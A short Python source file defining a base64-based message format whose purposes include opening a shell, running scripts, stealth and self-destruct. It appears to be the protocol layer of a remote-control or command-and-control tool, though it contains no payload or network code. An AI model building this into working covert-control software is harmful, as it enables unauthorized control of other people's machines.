from typing import Iterable, List, Optional
from base64 import b64encode, b64decode
import random
import string


class MESSAGE_PURPOSE:
    PING, OPEN_SHELL, RUN_SCRIPT, STEALTH, SELF_DESTRUCT = [str(i) for i in range(5)]


class Message:
    # source_instance_id: str
    # destination_instance_id: str
    purpose: str
    args: List[bytes]
    message_id: str
    reply_message_id: Optional[str]

    def __init__(self, purpose: str, args: Optional[Iterable[bytes]] = None, message_id: str = None, reply_message_id: Optional[str] = None):
        self.purpose = purpose
        self.args = list(args) if args is not None else []
        self.message_id = message_id if message_id is not None else ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        self.reply_message_id = reply_message_id

    def to_string(self) -> str:
        return ':'.join([b64encode(prop.encode()).decode() for prop in (
            self.purpose,
            ':'.join([b64encode(arg).decode() for arg in self.args]),
            self.message_id,
            self.reply_message_id if self.reply_message_id is not None else ''
        )])

    @classmethod
    def from_string(cls, line: str) -> 'Message':
        props = [b64decode(prop).decode() for prop in line.split(':')]
        props_formatted = [
                props[0],
                tuple(b64decode(arg) for arg in props[1].split(':')),
                props[2],
                props[3] if props[3] != '' else None,
        ]
        return cls(*props_formatted)

    def __str__(self):
        return f'{self.message_id}:{self.purpose}:{self.args}'
